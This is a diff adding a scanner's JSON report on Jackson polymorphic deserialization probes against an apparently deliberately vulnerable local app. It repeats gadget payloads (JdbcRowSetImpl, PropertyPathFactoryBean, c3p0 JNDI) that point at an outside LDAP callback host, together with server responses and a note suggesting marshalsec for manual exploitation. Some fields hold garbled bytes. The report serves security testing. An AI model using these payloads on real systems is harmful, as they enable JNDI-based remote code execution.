+        "¦ÞÉZrF¥z»lr\u0016§é\\¢l\u001enû¥z{ãjö¦¨uépy¸h¢D¥iÉ\u0002©çz\\\u001en\u001a(JåÛi³ÿá¢,²VÊ&þÇ«¾'\u001e³"
+      ],
+      "notes": "Jackson default/polymorphic typing JSON detected (WRAPPER_ARRAY [\"class\",{...}] or @class/@type) — the application likely calls ObjectMapper.enableDefaultTyping()/activateDefaultTyping() | Not auto-exploited: generate a gadget JSON manually with marshalsec (marshalsec.Jackson) against a known gadget (e.g. JdbcRowSetImpl + JNDI), then replay and review the response",
+      "risk_level": "High",
+      "severity": "High",
+      "subtype": "Jackson Polymorphic Typing",
+      "suggested_probe": "jackson_manual",
+      "type": "Java",
+      "url": "http://localhost:8081/api/webhook/config"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "com.sun.rowset.JdbcRowSetImpl",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=564",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.rowset.JdbcRowSetImpl`: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"name\\\":\\\"custom\\\",\\\"background\\\":[\\\"com.sun.rowset.JdbcRowSetImpl\\\",{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]}\\\"; line: 1, column: 64] (through reference chain: com.webvulenv.javaapp.model.ThemeImportRequest[\\\"background\\\"])\"}",
+            "length": 564,
+            "status": 400
+          },
+          "payload": "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=834",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `org.springframework.beans.factory.config.PropertyPathFactoryBean`: Illegal type (org.springframework.beans.factory.config.PropertyPathFactoryBean) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"name\\\":\\\"custom\\\",\\\"background\\\":[\\\"org.springframework.beans.factory.config.PropertyPathFactoryBean\\\",{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]}\\\"; line: 1, column: 99] (through reference chain: com.webvulenv.javaapp.model.The",
+            "length": 834,
+            "status": 400
+          },
+          "payload": "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=549",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.mchange.v2.c3p0.JndiRefForwardingDataSource' as a subtype of `java.lang.Object`: no such class found\\n at [Source: (String)\\\"{\\\"name\\\":\\\"custom\\\",\\\"background\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"loginTimeout\\\":\\\"0\\\"}]}\\\"; line: 1, column: 82] (through reference chain: com.webvulenv.javaapp.model.ThemeImportRequest[\\\"background\\\"])\"}",
+            "length": 549,
+            "status": 400
+          },
+          "payload": "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=587",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.rowset.JdbcRowSetImpl`: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"name\\\":\\\"custom\\\",\\\"background\\\":[\\\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\\\",[{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]]}\\\"; line: 1, column: 85] (through reference chain: com.webvulenv.javaapp.model.ThemeImportRequest[\\\"background\\\"])\"}",
+            "length": 587,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\",[{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=858",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `org.springframework.beans.factory.config.PropertyPathFactoryBean`: Illegal type (org.springframework.beans.factory.config.PropertyPathFactoryBean) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"name\\\":\\\"custom\\\",\\\"background\\\":[\\\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\\\",[{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]]}\\\"; line: 1, column: 120] (through reference chain: com.web",
+            "length": 858,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\",[{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"name\":\"custom\",\"backgroundType\":\"com.webvulenv.javaapp.model.theme.ColorBackground\"}",
+            "length": 101,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=101 mutated=416",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to import theme: com.fasterxml.jackson.databind.JsonMappingException: Failed to parse type 'java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>' (remaining: '>'): Cannot locate class 'com.mchange.v2.c3p0.JndiRefForwardingDataSource', problem: com.mchange.v2.c3p0.JndiRefForwardingDataSource (through reference chain: com.webvulenv.javaapp.model.ThemeImportRequest[\\\"background\\\"])\"}",
+            "length": 416,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>\",[{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]]",
+          "payload_type": "jackson_oob"
+        }
+      ],
+      "confidence": "Medium",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Jackson Polymorphic Deserialization",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=400",
+        "Response length changed significantly: baseline=101 mutated=564",
+        "Error/exception disclosure in response: ['exception']"
+      ],
+      "likely_vulnerable": true,
+      "location": "raw_body",
+      "method": "POST",
+      "mutations_count": 6,
+      "name": "payload",
+      "normalized": [
+        "{\"@class\":\"com.webvulenv.javaapp.model.theme.ColorBackground\",\"color\":\"#1f2937\"}"
+      ],
+      "notes": "Jackson default/polymorphic typing JSON detected (WRAPPER_ARRAY [\"class\",{...}] or @class/@type) — the application likely calls ObjectMapper.enableDefaultTyping()/activateDefaultTyping() | Not auto-exploited: generate a gadget JSON manually with marshalsec (marshalsec.Jackson) against a known gadget (e.g. JdbcRowSetImpl + JNDI), then replay and review the response",
+      "risk_level": "High",
+      "severity": "High",
+      "subtype": "Jackson Polymorphic Typing",
+      "suggested_probe": "jackson_manual",
+      "type": "Java",
+      "url": "http://localhost:8081/api/theme/import"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.sun.rowset.JdbcRowSetImpl",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=645",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.sun.rowset.JdbcRowSetImpl' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"com.sun.rowset.JdbcRowSetImpl\\\",{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]}\\\"; line: 1, column: 68] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 645,
+            "status": 400
+          },
+          "payload": "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=881",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'org.springframework.beans.factory.config.PropertyPathFactoryBean' as a subtype of `java.lang.Object`: Configured `PolymorphicTypeValidator` (of type `com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator`) denied resolution\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"org.springframework.beans.factory.config.PropertyPathFactoryBean\\\",{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]}\\\"; line: 1, column: 103] (through ",
+            "length": 881,
+            "status": 400
+          },
+          "payload": "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=560",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'com.mchange.v2.c3p0.JndiRefForwardingDataSource' as a subtype of `java.lang.Object`: no such class found\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"loginTimeout\\\":\\\"0\\\"}]}\\\"; line: 1, column: 86] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 560,
+            "status": 400
+          },
+          "payload": "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=598",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.rowset.JdbcRowSetImpl`: Illegal type (com.sun.rowset.JdbcRowSetImpl) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\\\",[{\\\"dataSourceName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"autoCommit\\\":true}]]}\\\"; line: 1, column: 89] (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 598,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.sun.rowset.JdbcRowSetImpl>\",[{\"dataSourceName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"autoCommit\":true}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=869",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `org.springframework.beans.factory.config.PropertyPathFactoryBean`: Illegal type (org.springframework.beans.factory.config.PropertyPathFactoryBean) to deserialize: prevented for security reasons\\n at [Source: (String)\\\"{\\\"label\\\":\\\"slack alerts\\\",\\\"channel\\\":[\\\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\\\",[{\\\"targetBeanName\\\":\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\",\\\"propertyPath\\\":\\\"foo\\\",\\\"beanFactory\\\":[\\\"org.springframework.jndi.support.SimpleJndiBeanFactory\\\",{\\\"shareableResources\\\":[\\\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\\\"]}]}]]}\\\"; line: 1, column: 124] (through reference ch",
+            "length": 869,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<org.springframework.beans.factory.config.PropertyPathFactoryBean>\",[{\"targetBeanName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\"]}]}]]",
+          "payload_type": "jackson_oob"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"success\":true,\"channelType\":\"com.webvulenv.javaapp.model.webhook.SlackChannel\",\"label\":\"slack alerts\"}",
+            "length": 104,
+            "status": 200
+          },
+          "chain": "java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=400",
+            "Response length changed significantly: baseline=104 mutated=423",
+            "Error/exception disclosure in response: ['exception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to parse webhook config: com.fasterxml.jackson.databind.JsonMappingException: Failed to parse type 'java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>' (remaining: '>'): Cannot locate class 'com.mchange.v2.c3p0.JndiRefForwardingDataSource', problem: com.mchange.v2.c3p0.JndiRefForwardingDataSource (through reference chain: com.webvulenv.javaapp.model.WebhookConfigRequest[\\\"channel\\\"])\"}",
+            "length": 423,
+            "status": 400
+          },
+          "payload": "[\"java.util.ArrayList<com.mchange.v2.c3p0.JndiRefForwardingDataSource>\",[{\"jndiName\":\"ldap://nzsmzmtyfhznkssyysew50lx5siyor63r.oast.fun/a\",\"loginTimeout\":\"0\"}]]",
+          "payload_type": "jackson_oob"
+        }
+      ],
+      "confidence": "Medium",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Jackson Polymorphic Deserialization",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=400",
+        "Response length changed significantly: baseline=104 mutated=645",
+        "Error/exception disclosure in response: ['exception']"
+      ],
+      "likely_vulnerable": true,
+      "location": "raw_body",
+      "method": "POST",
+      "mutations_count": 6,
+      "name": "payload",
+      "normalized": [
+        "[\"com.webvulenv.javaapp.model.webhook.SlackChannel\",{\"webhookUrl\":\"https://hooks.slack.com/services/...\"}]",
+        "¦ÞÉZrF¥z»lr\u0016§é\\¢l\u001enû¥z{ãjö¦¨uépy¸h¢D¥iÉ\u0002©çz\\\u001en\u001a(JåÛi³ÿá¢,²VÊ&þÇ«¾'\u001e³"
+      ],
+      "notes": "Jackson default/polymorphic typing JSON detected (WRAPPER_ARRAY [\"class\",{...}] or @class/@type) — the application likely calls ObjectMapper.enableDefaultTyping()/activateDefaultTyping() | Not auto-exploited: generate a gadget JSON manually with marshalsec (marshalsec.Jackson) against a known gadget (e.g. JdbcRowSetImpl + JNDI), then replay and review the response",
+      "risk_level": "High",
+      "severity": "High",
+      "subtype": "Jackson Polymorphic Typing",
+      "suggested_probe": "jackson_manual",
+      "type": "Java",
+      "url": "http://localhost:8081/api/webhook/config"
+    },
+    {
+      "attempts": [],
+      "confidence": "Low",
+      "confirmation_status": "Suspected",
+      "exploit_type": null,
+      "indicators": [],
+      "likely_vulnerable": false,
+      "location": "header",
+      "method": "POST",
+      "mutations_count": 0,
+      "name": "Content-Type",
+      "normalized": [
+        "application/x-java-serialized-object"
+      ],
+      "notes": "",
+      "risk_level": "Low",
+      "severity": "Low",
+      "subtype": null,
+      "suggested_probe": "unknown",
+      "type": "Unknown",
+      "url": "http://localhost:8081/api/integration/receive"
+    }
+  ],
+  "stats": {
+    "after_filter": 6,
+    "findings": 6,
+    "likely_vulnerable": 5,
+    "vectors_scanned": 76
+  },
+  "target": "localhost:8081"
+}
